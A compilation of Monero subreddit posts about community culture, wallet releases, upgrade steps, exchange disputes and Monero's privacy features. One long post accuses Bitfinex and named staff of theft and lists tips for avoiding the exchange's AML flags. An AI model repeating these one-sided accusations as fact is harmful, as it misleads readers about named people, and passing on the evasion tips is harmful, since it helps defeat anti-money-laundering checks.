- Proof of send
- Proof of reserve
- LightWallet 
- MultiSig

C/M
XMR: <removed>"
"I've slowly been starting to see a shift in this subreddit over the last couple months, but two recent posts, well as other individual's reactions in those posts have really driven it home for me.

**This subreddit is an echo chamber.**

I think it's extremely important to take a moment to recognize that the subscribers of this subreddit are self selecting, and are therefore more predisposed to certain ideas or more understanding of certain ideals.

Not only that, but I *especially* think we need to take a look at ourselves because I gather a fair amount of us believe we're ""independent thinkers"" or that we ""think critically"" about issues - otherwise how else would we have come to prefer Monero over other ""shitcoins"" / cryptocurrencies?

I believe this mindset is even more prone to echo chambers because we wind up selecting echo chambers of our own choosing without even realizing it, and we wind up dropping our guard.

I'm seeing increasingly concerning thought patterns (aka memes) occurring, like this whole ""Don't Buy Monero"" thing. (Yes, we have memes on this subreddit and barely anyone realizes it)

I think this ""Don't Buy Monero"" meme is downright harmful, especially without the phrase that originally followed - ""Cryptocurrencies are harmful to the banking system and may weaken the state apparatus.""

Even with the full text, not everyone is going to be inspired to google what Monero is. Even then, a smaller subset is going to consciously want a change to ""state apparatus"" and ""banking system"". There's a ton of bad press out there for monero (""Its only used for drugs"") and a statement like ""Don't Buy Monero"" only reinforces that. People don't think about everything they read. People may see it out of the corner of their eye, and not even really think about it, but form the association that Monero = Bad.

Even the alternative interpretation of ""Don't Buy Monero"" is harmful, the interpretation being that people should not be buying it to hold, but only to use as an actual currency.

There's nothing wrong with speculation (at healthy levels). There's nothing wrong with buying monero as a store of value. People need to lighten up a little bit and realize that some holding and some speculating isn't going to kill this coin. And of course there's nothing wrong with actually using Monero either.

But tell people they should ""only use monero"" is one of the very same problems Monero is trying to solve, IMO, except its sneakily crept in the back door:

**We should not be telling people what they can or cannot do with their own money**

Further continuing that, I've noticed a general air of elitism and self-congratulation spreading across this subreddit.

Can we please stop acting like XMR is the godsent crypto that's going to change the world.

Can we please stop acting we're the best cryptocurrency community out there.

I'd probably even agree with those statements (that's partly why I'm here, after all) but it's reaching unhealthy levels of circlejerk that will ultimately harm this community. If you really care about this community, and want it to be the best, then we need to be balanced, humble and open.

Please think for yourself.

Please realize that nothing is infallible.

Please realize other view points are OK.

# How do I upgrade? 

First and foremost, we encourage users to check the integrity of the binaries and verify that they were signed by Fluffypony's GPG key. A guide that walks you through this process can be found [here](https://github.com/qubenix/monero-site/blob/7edf03f77d4c4e9fcd11bfd3de68440e5322279b/_i18n/en/resources/user-guides/verification-windows-beginner.md) for Windows and [here](https://github.com/qubenix/monero-documentation/blob/qubenix-verify/binary-verification.md) for Linux and Mac OS X. 

If you are using the GUI you ought to perform the following steps:  

1. Download the new binaries (the `.zip` file (Windows) or the `tar.bz2` file (Mac OS X and Linux)) from [the official website](https://getmonero.org/downloads/) or [Github](https://github.com/monero-project/monero-gui/releases/tag/v0.12.0.0).

2. Extract the new binaries to a new directory of your liking. This is the easiest and recommended way. Alternatively, however, you can overwrite the old binaries.

3. Open `monero-wallet-gui`^1. It should automatically load your ""old"" wallet and you should be set for the upcoming scheduled network upgrade.  

(1) On Linux you ought to start the GUI with the `start-gui.sh` script, i.e., `./start-gui.sh`.  

Note that a blockchain resync is **not** needed, i.e., it will simply pick up where it left off.

"Hi all

Just performed a new push, here are the news:

**Status**

The wallet private key is now inited with the device seed. It do not use the
24 words mnemonic of Monero  but the seed device from path:

    /0x8000002C/0x80000080/0x80000000/0x00000000/0x00000000

aka 

    /44'/128'/account'/0/0

To make short the scheme is the following, assuming S is the seed from given path:
  
    a = keccak(S)
    a[0]  &= 0xF8;    
    a[31]  = (a[31] & 0x7F) | 0x40;

    b = keccak(a)
    b[0]  &= 0xF8;    
    b[31]  = (b[31] & 0x7F) | 0x40;


The --generate-from-device seems to be fully functional. It retrieves the public
keys (A,B)  from the device and restore the wallet from them. If it exists any funds
on the block chain associated with, they are retrieved.
Note that scanning the whole blockchain is long, very long as all block as to be decode
by the device.

Transfer are now required to be validated on-screen: destinations amounts and fees 
have to be validated by user. Ok, I need to finish the check on the client side to abort tx
is user reject it. Don't blame me for not doing it in this push  :)

**Next**

So what next?

Reference doc has to be updated!

On device side, I have to add the hash-state machine to ensure the integrity of the 
whole process and avoid data modification between destination/amount validation 
and final signature.

On client side all error code returned by device has to be checked and TX has to be aborted if needed.

And then? Prepare a *Push Request* on 0.11.0 branch :).
This will start the code review by the core team and I expect by others. During that, I will
start a merge on master branch and work on the sub-address feature from kenshi84.
I will also provide linux *cli* binary for those who want to test various scenario on testnet.

**Beer&Pizza**

I will see btchip and others end of second week of December: Will be so cool!
So you can continue to sponsor, It is very appreciated and motivating  ;)

"Hi All,

We hereby release the source for Cake Wallet for Monero for iOS under the terms of the MIT open source license.  This is the first truly open source Monero wallet for iOS.


**The code uploaded to GitHub has NOT been submitted to Apple yet as we are still testing.**

 I ask the community to test and suggest/submit improvements as well.  We will probably submit to Apple by end of the day today.


I feel our app is much superior to others because it is feature rich.  It allows the user to have multiple wallets, change the node settings, choose a transaction priority fee, biometric authentication, recover from seed, QR Scanner, and more.


GitHub link:


https://github.com/fotolockr/CakeWallet


We look forward to the constructive criticism, suggestions, comments, compliments(?).


As you all know, we did not ask for funding from the community and are giving this code AND the app in the App Store at no cost to help and promote Monero.  So, donations are appreciated.

"Hello moneroers. I recently uncovered a Dash moderator [insulting hundreds of users](https://www.dash.org/forum/threads/basilpop-the-dash-subreddit-moderator-does-not-have-the-temperament-to-be-a-moderator-part-2.37699/#post-186107) on r/dashpay. It made me sick to read that guy's history. Nothing happened after I reported it, except me being banned from that subreddit and accused of being a Monero shill and a Monero spy \(I don't even own any Monero\). I'm a Paulo Coelho fan so this could be an omen, so here I am to learn as much as I can about your coin. 

Before asking any questions I will spend some hours reading and googling. I will update this post with my questions, please be gentle. Thanks. "
"It's interesting to note at this particular moment in time that Ripple is gaining momentum and has taken #2 spot on coinmarketcap, despite being a centralized token that goes against what crypto was initially envisioned for (decentralization).

It has strong backing from banks and institutional investors (which is also against crypto's anti-bank roots), including a keynote address from Ben Bernanke, former head of the US Federal Reserve.

It's also interesting to note that in comparison, Monero is comparatively tiny - which is ironic in that Monero is one of the best (if not THE best) crypto out there when it comes to fulfilling Satoshi's original vision of private and decentralized money.

Monero/XMR will always perform well as it is a necessity and fills its own niche in the market. However I do believe that Banks will intentionally avoid financing Monero's growth which may hinder it short to medium term in terms of growth compared to the likes of Ripple.

However in saying that, there is literally $60 Trillion + (not including ultra deep money that is undetectable) in private money across the world - indicating an obvious demand for financial privacy. There are plenty of deep pockets that will support Monero/XMR in the longterm.

This to me are the first obvious signs coming to light of Banks fighting back against decentralized crypto-currency, including the obvious Futures market for Bitcoin designed to ""tame"" and ""control"" its price.

"## $37,500 Stolen by Bitfinex who confirm they are operating out of the USA & Servicing US customers.

**CONFIRMED. CRYPTO HAS BEEN STOLEN BY BITFINEX - AS THEY HAVE CONFIRMED THEY HAVE STOLEN $37,500 AND NOW REFUSE TO COMMUNICATE WITH ME AND ARE DEMANDING PRIVACY SAYING I AM POSTING EVERYTHING ONLINE? Privacy is a two way street, you claimed I was a terrorist or criminal as I wanted my own privacy, and now you are demanding the same by your own judgement are you criminals as you want some privacy too? SEE ""A reply from Bitfinex Support who are now REQUESTING PRIVACY THEMSELVES.""** A shocking ""loaded gun"" they confirmed they are indeed operating out of the USA along with their FinCEN number despite not allowing US customers, confused much? So am I.

If anyone can help please send me a private message I am happy to pay. 
If you are great at any of the below, message me! I have money ready to hire you RIGHT now.

1. Website Developer
2. Social Media Advertiser
3. Legal Expert
4. Further evidence of Bitfinex/Tether wrongdoing.

Update 2/3/18.

Users who use Monero, a VPN or who make large withdrawals will have their Bitfinex account frozen for ""illegal activity"" despite trading crypto only and just going about ones day to day trading. That's right Bitfinex is now Judge, Jury, and Executioner and if you use Monero you are classed as an ILLEGAL CRIMINAL TERRORIST by the automated (not so automated - it was manual intervention upon withdrawal) system. Be prepaired to bend over and supply your birth certificate, your mothers and your brothers along with your biometric fingerprint for **If you use Monero there is a high possibility you are a terrorist or criminal so we require KYC/CTF details so we can tag all your addresses and future addresses be it withdrawals in BTC or ETH or any other token. We reserve the right to ask for further documentation from you.** (Care to explain your policy? /u/social_bfx)

## Update from Reddit Support:

**""I apologise, I phrased that wrongly. Unfortunately it's a requirement to have these sorts of flags in place and there's nothing we can do about it. It's not an internal policy.""** - AML/KYC is recommended industry best practice and is set by the organisation itself not enforced procedure, as I have asked, who's policy is this if it's not Bitfinex? I am a law abiding citizen and to call me a terrorist and threaten counter-terrorist financing because I use Monero is a bit steep. I'm not buying weapons in Afghanistan here with money from Zimbabwe, I am trading digital tokens. I'm no expert but I have spent the past 14 hours researching this. 

## Further Update from Bitfinex Support E-mail:

**""If you are unable or unwilling to do so we can only conclude we did in fact flag your account for the correct reasons.""** - Bjorn de Wolf (support@bitfinex.com). 3 February 2018 1:02 PM (UTC Server Time)

Thank you for your reply. I am appauled with your statment ""If you are unable or unwilling to do so we can only conclude we did in fact flag your account for the correct reasons."" you are in short saying if you don't comply with your obtrusive request then you are indeed a criminal or terrorist, this is shocking to say the very least on the matter, and as I have read the KYC/AML handbook it clearly states that as a compliance officer you are not an investigator or law enforcement and have no authority to make such a judgement, this is guilty until proven innocent in this context which is raising more red flags with myself concerning your organisation than I have raised red flags on your own platform I can assure you - this is alarming to say the least that you are not familiar with the compliance you are quoting and/or do not have a compliance officer and are doing this on a budget. No compliance officer would make this statement EVER to a customer which is very worrying.

## ANOTHER SHOCKING REPLY FROM BITFINEX SUPPORT

**If your privacy is more important than the funds held on Bitfinex, then this is a confirmation we did in fact flag your account for the correct reasons (i.e. illegal activity).**

Just becuse a user is concerned about their privacy, and how and who is handling their data does not mean it is illegal activity, what world is Bitfinex living in? Christ almighty this is absolutely dumbfounded me, they still have not replied to my two e-mails asking for the information I have requested. So let me get this anyone who wants privacy is illegal well the simple answer is how about you provide us your personal e-mail and password Bitfinex Support and I will choose what I publish. Privacy is a two way street. 

## A reply from Bitfinex Support who are now REQUESTING PRIVACY THEMSELVES.

Looks like I touched a raw nerve asking basic questions like who is their compliance officer, what is the address of the company.

Looks like they are in fact STEALING my crypto, as confirmed by this e-mail below. I said previously privacy is a two way street, look who is asking for privacy now and threatning to throw their toys out the pram unless once again I bend over and COMPLY? 

				You should have asked these very questions before transferring over 37,5000 USD worth of Monero to Bitfinex, not after being asked to provide KYC information and a proof of source of funds.
				**If you keep posting parts or all of the information in this email thread on social media we will no longer reply to your messages, privately nor publicly. If you do we will only communicate though our attorney and only to your legal counsel.** The fact there are more anonymous ways of trading XMR, may well be, however we have seen many cases where funds deposited using more or less identical actions as you took, were in fact the result of illegal activities. We will not allow this. If we detect this type of activity we will do as we describe in our terms of service we will do. You may not agree, but disagreeing to our terms of service after using our service is problematic. If you do not agree to our terms and you are particularly keen in not disclosing your identity Bitfinex is not suitable for you and you should have informed yourself before using the Bitfinex platform.

				Stuart Hoegner, First Canadian Place, 100 King St W, Suite 5700, Toronto, ON M5X 1C7 Canada.
				
				3. Please provide me with your compliance officers name and contact details/address.
				We will provide this through our attorney if and when this becomes relevant. Given you have not cooperated in any way we will not provide this information at this point.
				
				4. Please tell me what jurisdiction my information will be held under and the relevant data protection laws and registrations numbers that you have a legal obligation when handling sensitive data in almost every 1st world country throughout the world.
				iFinex is a BVI company. we will follow BVI AML regulations and guidelines. KYC information will be handled accordingly.
				
				5. You publiclly stated that and I quote ""Unfortunately it's a requirement to have these sorts of flags in place and there's nothing we can do about it. It's not an internal policy"" AML/KYC is best practice however not an enforced requirement, I kindly request you identify who is forcing this non-internal policy upon yourselves, and me.
				
				BVI FSC (http://www.bvifsc.vg)
				
				Instead of you asking even more questions in a follow up mail, please start answering the questions you were asked. If you send a similar email with a list of questions as you did in the previous email we will no longer respond. We are far too busy to discuss all the details of international AML - CTF policies with users. if that is the course you wish to take, so be it, but we will only do so through our attorney and only with your attorney after having established either your attorney's identity or your identity.

## Original Reddit Post:  


I want to share an important warning to /r/monero with regards to www.bitfinex.com's practice regarding Monero trading/deposits/withdrawals the simple fact is even if you are a crypto only trader with an unverified account this should allow you to trade crypto to crypto free of hinderance, however this is not what is going on at Bitfinex they are FREEZING your account at the point of when you try to withdraw your XMR - or any token bought using an XMR deposit, try and withdraw ETH after selling your XMR, it won't work they will freeze your account. 

My username doesn't reflect my feelings, I opened this account 10 days ago to post in the /r/bitfinex subreddit to ask for help, I forgot to enter the Payment ID on my transaction and it was lost I waited weeks for them to restore it and they did thankfully only to charge me a $150 recovery fee (in hindsight they should have just said sorry its ours as when you try and withdraw we are taking it anyway!) and then when I try and withdraw holding my withdrawal hostage because I used XMR, please see their e-mail from Bjorn de Wolf below.

As you can imagine I am a keen supporter of Monero for its privacy features I believe everyone should be able to trade freely and privately without hinderance of state or third parties, enter crypto and monero providing the solution however exchanges like Bitfinex want to break your privacy and demand your ID, Selfie, Tax Returns, Proof of funds, transaction IDs, detailed explinations asking where are you sending your funds, bend over and take it! We have your money at the point of withdrawal. 

My crypto is being held hostage over $30,000 USD equviliant by the shady Bitfinex exchange which not only doesn't provide their own address and information and fire their own auditers for Tether and cannot provide me with any information regarding where my data will be kept, handled or who their compliance officer is it's hypocrisy of the highest order they under investigation by the US Authorities and have the audacity to demand a crypto-to-crypto only trader who wishes to remain private to provide all their personal information.

Bjorn de Wolf is a senior support (higher up in Bitfinex) employee who decided in this instance that the money they print from USDT Tether is not enough and that they now need to steal Monero users hard earned crypto, they are quoting AML/CTF which applies to fiat transactions and is best practice for firms, however I signed up as a crypto only user after seeing advertising saying crypto-to-crypto would be open and free ID would only be needed if you wanted to withdraw into USD or USDT. The same protections designed to protect the finance systems of the world is being used as an excuse to steal from crypto users - which is just digits on a blockchain 0's and 1's in reality, not classed as currency. 

The simple answer to this for Bitfinex would be: 

IF BITFINEX DONT WANT CRYPTO ONLY USERS TO TRADE XMR THEY SHOULD DISABLE IT LIKE THEY DO THE USDT TOKEN FOR UNVERIFIED USERS, THAT OR A **CLEAR** WARNING!

-------
Progression Update (no reply since asking for registered address and BASIC data protection information): 

I understand I have written a lot of this in anger, yes I know a lot of you are reading this thinking what an idiot, your right. However there is a difference in $30 and $30,000 it's a lot of money by any consideration, it was my mistake for using Bitfinex I did not have any clue they would freeze people who use XMR to withdraw or deposit and FREEZE if the account was not verified. Whatever your thoughts on this situation are I think we can all agree Bitfinex should simply make Monero a restricted token, like they have for others as well as USDT and prevent its use unless the account is verified a trader should not find out at the point of withdrawal its holding hostage to traders funds. 

How am I in this situation? I can only think my use of a free VPN perhaps triggered some measures on Bitfinex such as there being other users on the same IP, perhaps the amount lump sum? Maybe smaller withdrawals would have worked who knows. I am not trying to bypass any of these security measures this is why I blinded ended up in this situation thinking all was right with the world, I value privacy and because of that I know Monero has a bright future with exchanges acting like this just confirms there is a 100% real world use for Monero in this world. 

**The only way I can see to avoid this is to not use Bitfinex, you cannot avoid this issue because they require a $10,000 deposit to even open the account, which will trigger this account freeze if you use XMR or a VPN**

I have donated 1 BTC to Bitfinexed (http://www.twitter.com/bitfinexed) 

https://blockchain.info/tx/f04efe865ba1d46bb311a95fa3c912d0431635987113e57ea6881243f9d97d61

Please help support the great length he goes to expose this Bitfinex/Tether scam, I will continue to donate a percentage of all my future crypto trading once a month to Bitfinexed.

We need decentralized exchanges, I don't know how Monero will move to a decentralized exchange but one is desperately needed or people who wish to remain private will have funds stolen by the likes of BITFINEX I think this should be one of the highest priorities for the crypto world to work out a solution to trading blockchain-to-blockchain decentralized.

Please discuss this, it needs to be discussed I know it's likely I am not going to ever see my crypto again however if it triggers an important discussion or awareness of Bitfinex and the issue with Monero not having decentralized exchanges it was a worthwhile loss, even if it was the past 6 months of my crypto profits.

I think its very possible. Let's go through a breakdown.

    Free privacy e-mail account.
    Free VPN service.
    Monero.
    A deposit that takes weeks to recover, of which you then withdraw straight away as the market has crashed.

These 3 will class you in Bitfinex as a money laundering terrorist. I have requested information on how my information will be handled, however Bitfinex has not responded not even providing the most basic information such as company information, or who their compliance officer is. If you are going to enforce a AML policy it works both ways you have to ensure my data is protected and what jurisdiction, they have not done so and are refusing to provide the basics of information - How do I know who they are? They are asking information from me very personal information yet won't provide the most BASICS of their own I'm not asking for a selfie, passport and all their transaction history.

So let's now theroize how to avoid Bitfinex issues in future, or lets title this ""How to be an actual criminal, or how do act when you are suspected for no reason of being a criminal or terrorist by Bitfinex""

    Don't use Bitfinex, don't use it if you use Monero.
    Use an e-mail account such as gmail.
    Use a residential IP address
    Withdraw USING A PAYMENT ID (It looks like sending to an exchange, etc.) 
    Make your account deposit with something other than XMR, use BTC or ETH.
    Don't withdraw large sums, like others have said leave a large balance in, perhaps leave a few open orders.
    Don't request how your information is handled or Bitfinex's company information or who the compliance officer is, you won't get a reply, but they will ask for your life story and all your transaction history dating back to your childhood.
    Donate to Bitfinexed and support his great work in exposing the Bitfinex SCAM.
    No VPN, No Privacy Email, No XMR Deposits within the first 60 days of opening the account.


""I really believe that we don’t have to make a trade-off between security and privacy. I think technology gives us the ability to have both.""– John Poindexter 

				Supposedly getting a deposit lost, getting it back, panic withdrawing it in full classifies you as a ""TERRORIST"" or ""CRIMINAL"" by the COURT OF BITFINEX and they will freeze your $37,500.00 (thanks for the figure Bitfinex!) and laugh all the way to the bank. 

				They are having a great time, printing fake money with Tether pushing up the price of BTC and when the market isn't doing too well steal from the small guys like you and me. 

				This is far from over Bitfinex it has only just started you think you can get away with stealing from your members then banning them from replying to your support tickets and won't reply publiclly, it's the act of criminals, you accuse me with no ground foundations of being a criminal yet who has stolen $37,500? Bitfinex, that's who.

				**There is more than one way to skin a cat.**

**I am drafting a letter to the Commodity Futures Trading Commission and FinCEN regarding this issue and my situation. I am not looking to enter a legal dispute with Bitfinex and I am happy to resolve this once they answer my questions in the e-mail I have sent them. Which I have sent for a second time as they ignored my first request only quoting their FinCEN number which is for the USA of which they no longer operate, hence my reason for contacting the agencies stated above as it appears they are operating out of the USA?** Thanks for the private messages, if you have any more information concerning Bitfinex I suggest you contact them yourself or the right consumer protection boards I will only be contacting them about the issue of them operating as a US business, and serving US customers and raise my concerns in a direct letter to those who have dealt with BFXNA INC. in the past and are aware of them (at least at the CFTC as finding someone who understands this industry is hard enough.) I am in contact with crypto news websites and an EFF long standing member who is aware of this situation and is ready to help. A serious privacy concern, it wasn't until you read Bitfinex own replies and lack of response to basic questions on where is my data and who are you?

## I wait weeks for my missing deposit to be restored, the market crashes and I attempt to withdraw it as I don't want to trade after loosing so much money waiting for Bitfinex and suddenly I am a criminal as I match ""Criminal or terrorist"" actions of other users. **BITFINEX LOGIC**"

My fellow Monero enthusiasts,

After what seems like an eternity we now have a person-to-person trading platform dedicated exclusively to Monero. Hopefully, the community will be accepting and we will see ads popping up all across the globe in the near future.

As is evident from the look and feel of the website, we ~~blatantly ripped off~~ were *heavily inspired* by LocalBitcoins.com (if it ain't broke...). However, we believe that as the specific needs of the Monero community will be brought to our attention the website will evolve into its own unique entity.

We are a team of Monero enthusiasts based in Hong Kong. Hong Kong is one of the three financial capitals of the World (the other two being New York and London), and is also the World’s freest economy. In addition, Hong Kong is known in the cryptocurrency industry as being one of the best jurisdictions for cryptocurrencies.

We are committed to your security and privacy. We don't bind any users' IPs and we don't require users to have emails. We keep trade chat logs for 180 days for purposes of dispute mediation. The logs are encrypted and all the attachments uploaded in the chat are watermarked and encrypted to prevent unauthorized use. Unfortunately (trust me, we hate it as much as you do), we do use Google APIs for geocoding (because theirs are the only ones that don't suck as far as we know) but we respect that some of our users will want to block Google, so for them we've provided the ability to input their latitude and longitude manually (used when searching for local trades near you).

Our site was built to be responsive and adaptive to different screen sizes, but we also plan to develop a mobile app if there is enough demand.

Additional features that we are planning to implement:


- Tor hidden service - done!
- JavaScript-free version of the site
- SMS notifications (for those who are willing to specify their phone)

We would like to personally thank **Moneromoo**, /u/gingeropolous, /u/dEBRUYNE_1 and /u/hyc_symas for the support they've offered us by being very patient in answering our stupid questions on IRC.

We would also like to thank /u/fluffyponyza for the encouragement. We've dedicated our 404 page to you, Riccardo.

Me an /u/Alex_LocalMonero will be active in this thread and on /r/LocalMonero as well as on the #monero IRC and #localmonero IRC (also on freenode)

"With reference to [this post](https://www.reddit.com/r/Monero/comments/917k32/bulletproof_protocol/), but I've seen many others.

People come from all over the net. They see us getting excited about Ledger, Bulletproofs, MimbleWimble, Fluffyblocks, Kovri, whatever it may be - and they ask questions.

Yes, we have been over it a million times - but these are new people. Why are some of the upvoted comments so unhelpful (and kind of rude)? I think we as a community could be much more inviting to newcomers interested in learning the tech.

Which means:

- Don't say ""Did you even use the search bar?""
 - I see this shit a lot too. If everyone used the search bar, honestly there wouldn't be much discussion. Also, just because something's been discussed, doesn't mean everyone's seen it and there aren't any new ideas
- Don't try to be smart and give excessively complicated links
 - Linking ""Zero to Monero"" is amazing if the person is new, and intrigued, and wants to learn more about Monero. Linking Zero to Monero is not appropriate for the question ""Hey I just found Monero, what's this about?""
- Noobs will be noobs. Ledger help, GUI support -- It's on us to make that stuff self explanatory and easy to use. Don't be a dick to people trying to figure that stuff out.
 - If they haven't gotten support, at least hear them out. If their question makes no sense, ask for clarification. Giving just the smallest bit of help is 10x better than downvoting an unanswered post.

I'm not saying everybody does this, because tbh the Monero community is really awesome (<3), but it still does happen sometimes. If you see it happening, be nice and try to make it better.

That's all :)"

"Hello, Monero community! I just wanted to say that I've thought about buying XMR many times over the past few months, and I was so impressed by Riccardo's presentation in Miami that I finally decided to pull the trigger. I think privacy coins offer a critically important use case and I've spent a lot of time trying to figure out which one I believe has the best long-term prospects. I'm not a computer scientist, but I've done my best to understand ring signatures, zk-SNARKS, the zerocoin protocol, etc., as well as the different consensus mechanisms used by all the popular coins. Every time, I've kept coming back to Monero for a lot of reasons, some good and some silly. I'm really impressed by the hard work of the Monero core team, especially when it comes to bleeding edge improvements and consistent progress (bulletproofs seem like a huge deal to me). I also like the name, color scheme, logo, and marketing -- not exactly the most important factors, but still nice to have! The community support is also a big deal for me.  It's obvious that there's a huge group of people invested in Monero's success and only the best projects are able to build a passionate following like this one.  

Riccardo's presentation really drove it all home for me. Aside from all the great information he shared, I genuinely found myself excited to support this project -- I couldn't stop laughing at his comments about ICOs and the hilarious subtitles on every slide. Anyway, long story short, I made my first purchase today and I'm thrilled to follow along as Monero continues breaking ground. I hope others are as excited as I am to have found this coin in its still-early stages!

(Edited slightly after I saw all the upvotes, thanks for the warm welcome! For those who haven't seen the presentation, it's the first fifteen minutes here: https://www.youtube.com/watch?v=HTbE8DXyjG8)"
"I recently pitched the idea of a Monero documentary to an up and coming independent film maker whose latest Netflix documentary has had much success. He is currently looking for a new project and despite not following Monero or even Bitcoin that closely, he became highly intrigued by my pitch. My pitch was rather vague actually as I do not yet know what the story will be but he was captivated by my explanation of cryptocurrency in general, its disruptive potential, and how Monero is establishing itself as the “True Crypto”. 

I am posting today to get feedback from the community on whether this project should be pursued. If you guys are interested and think this is a worthy project that Monero would benefit from and that the community would support I will show him this post and if he is sold on the response we will come back here to tell you more about who he is and to start developing the project with the community.

So the big questions are:

* Can we raise 1million dollars worth of Monero for the project? 1 million USD can get the job done. Assuming a kickass film will be made and distributed via Netflix, would you donate to this project?

* Will the names in the space be willing to participate (interviews etc.)? Please respond if so! I.E. u/fluffyponyza u/americanpegasus u/smooth_xmr u/bigreddmachine  etc...

* What is the story? Obviously anyone that watches will learn about what Monero is compared to Bitcoin, how it started, how it works, Fluffy’s favorite wine etc. But what is the story?? Is it simply about why the world needs an open-source, anonymous, private, and fungible coin? "

"Gilded!! Thanks so much!

EDIT:  The big concern we have seen from the feedback is the open-source issue.  So we will upload the source on GitHub with some license limitations and links for donations.   I will let everyone know when that is done.

EDIT 2: We are huge Monero fans and just did to support Monero.  As you can see, we are not charging anything to buy the app, or fees to send/receive, and not even ads on the app.  So we are open to the opensource idea and give to the community.

https://itunes.apple.com/us/app/cake-wallet-for-xmr-monero/id1334702542?mt=8

The App is completely free to buy and use (besides the Monero network fee - which is not our fee).

- create new wallets

- recover old wallets 

- send and receive (of course)

- change the priority fee in the settings

- use camera to scan QR

- change node/daemon settings

- Face ID

- and much more.

We love constructive criticism and are ready to listen about any bugs, improvements, etc.

"[Video Demo Link](https://streamable.com/62vm1)

For some background, in the summer of 2017 /u/serhack was funded for an FFS to develop open-source e-shop plugins for popular e-shop platforms. A bit later I started helping him out with them and got pretty involved so when it was time to do a second FFS for more plugins we did it together in a kind of ""joined FFS"". There was a decent amount of people using the plugins, but they depended on an active monero-wallet-rpc in order to validate transactions which isn't always the easiest for people who don't know that much about Monero, especially for people who aren't hosting their own site. Now that is no longer a requirement! Now all you need to setup an e-shop that accepts Monero is a Monero address and your viewkey. To verify payments the plugin connects to the API of block explorers like xmrchain.net It should be noted that using your own monero-wallet-rpc is still ideal because this new system sends your viewkey (over secure HTTPS) to decode outputs on the chain with it. If an attacker were to get your viewkey they still would not be able to steal your funds, you are 100% in control of your own private spend key, but they will be able to see your incoming transactions and infer your outgoing transactions. For people who simply want to accept Monero quickly and easily they can now do it **very** easily. Here is a demo of setting up and accepting a purchase with Monero all in ~90 seconds:

"Yesterday, Reddit banned a number of subreddits related to trading guns, drugs, alcohol, tobacco, prostitution and other naughty stuff. This came as a surprise to the moderators of these subs. The ban includes discussion groups that didn't allow trading at all, like /r/gundeals and our friends at /r/darknetmarkets. It also includes exchanging craft beers without any payment.

As usual, the admins didn't specify which subs were banned, leaving users to play a guessing game.

- [Provisional list of banned subs](https://np.reddit.com/r/announcements/comments/863xcj/new_addition_to_sitewide_rules_regarding_the_use/dw2a8h0/)

- [Some subs that weren't banned](https://np.reddit.com/r/announcements/comments/863xcj/new_addition_to_sitewide_rules_regarding_the_use/dw2o8mv/)

This ban might be motivated by [new legislation in the US](http://reason.com/blog/2018/03/22/reddit-bans-escort-subreddits) called FOSTA, which makes websites criminally liable for user-generated content if that content could be interpreted as advertising goods and services illegally. Would complaining to Reddit admins do any good at this stage? I don't know, I feel numb and tired, I just wanted to write this down because many Monero users are involved.

At which point does the regulation come so close that we should start looking for a decentralized alternative? I like using Reddit so much that I removed the app from my phone for being addictive. I don't want to join the trash heap of undesirables on Voat, and blockchain-based alternatives aren't ready yet. But they will be coming this year.

And are there still legal clearnet websites out there where we can find out what darknet market users expect from cryptocurrencies?
/r/DarkNetMarketsNoobs/, /r/Drugs and /r/opiates are still up so far, and the placeholder at https://voat.co/v/DNM is going to be activated now.

"Hello new and old faces! I noticed that there are more new faces here than usual, and I hope this post can help those who are perhaps a little lost.

The vast majority of existing members are here since we feel Monero is *revolutionary*. Monero is a tool that people can actually use. It makes receiving payments hassle-free, since **merchants and individuals no longer need to fear the source of funds they are accepting**. With transparent systems like Bitcoin, Ethereum, Verge, or Dash, these people need to hope (or spend substantial resources verifying) the sender did not use the funds illicitly. Furthermore, merchants do not want all their vendors known, and individually do not want everyone to know how much they are spending. If I spend more than I should at Newegg, that's my own business.

Monero is different because *every transaction* is **always private**. There is no way for pools and exchanges to opt out of sending private transactions. Thus, Monero's anonymity set far exceeds any other coin's anonymity set. [Over 86,000 transactions in the past *month*](http://moneroblocks.info/stats/transaction-stats) hid the sender and receiver, and about 99.95% of them also hid the amount (will increase to 100% of all new transactions in September)! There is no suspicion in using a private transaction, since *all* transactions are private. A single transaction does not stick out.*

This privacy is afforded with **the best technology**. I implore you to take a few minutes to learn about the four main technologies that Monero uses to provide privacy:

1. **Ring signatures** hide where the money comes *from*. Spent inputs in a transaction are hidden among several others that also appear to be spent. Thus, no one knows which source of money is actually being spent. Think of inputs as individual dollars or euros. [View a video about this topic here](https://www.youtube.com/watch?v=zHN_B_H_fCs). Note: this is NOT the same as mixing.

2. **RingCT** hides the *amount*. Instead of spending a known value of an input, you can cryptographically commit to a certain value without revealing what the value actually is. This is a very complicated topic, so [please view this video for more information](https://www.youtube.com/watch?v=M3AHp9KgTkQ).

3. **Kovri** is a work-in-progress tool to hide the *transaction broadcast*. Kovri will make it easy for users to hide their IP address when telling the network that they would like to make a transaction. Kovri will work with other cryptocurrencies and other projects through a common API, and Kovri can be used in a way to hide that you are using Monero at all. Kovri adds additional layers of network security for miners and pools, and it allows for the highest level of censorship resistance possible. A video for this project is not available yet, but you can check out the [Kovri website](https://getkovri.org). In the meantime, there are several guides to using Monero with Tor that work today, including [an unofficial Tails build](https://garlicgambit.wordpress.com/2017/04/16/monero-gui-on-tails-3/).

4. **Stealth addresses** hide where the money goes *to*. Instead of sending money to a specific address directly, certain outputs are allocated for addresses, but outside observers do not know which addresses these belong to. Even if ring signatures were compromised for some reason, then people would still not know the sending address in a transaction thanks to stealth addresses. [View a video about this topic here](https://www.youtube.com/watch?v=bWst278J8NA).

There are several other things that make Monero great! It has a smooth tail emission, dynamic blocks and fees, and an accessible Proof of Work (mining) algorithm. Feel free to ask around to learn more about these features. Try asking questions on the [Monero StackExchange](https://monero.stackexchange.com), or hop on [IRC](irc://chat.freenode.net/#monero)! Explore [the website](https://getmonero.org) and [community resources](https://monero.how/).

Monero's community is large, and we have several other subreddits to help organize it! Please also subscribe to the following that interest you:

1. /r/xmrtrader for price speculation and talk.

2. /r/MoneroMining for, er, Monero mining.

3. /r/MoneroCommunity for those who want to help grow the community.

4. /r/moonero for shitposts and memes.

5. /r/MoneroMarket for buying and selling wares for Monero.

6. /r/MoneroSupport for, you guessed it, Monero support.

Finally, **Monero has the best team**. [Over 270 contributors](https://www.openhub.net/p/monero) have brought Monero to where it is today. The vast majority of people donate their time to help Monero, but a few get paid through the [Forum Funding System (FFS)](https://forum.getmonero.org/6/ideas). This is how Monero can be a strong project despite not taking a portion of the block rewards or launching with a premine.

Anyway, we hope you stick around beyond the hype. Monero has a lot going for it, and we hope you agree! We really need your help, since this project is entirely driven by the community!

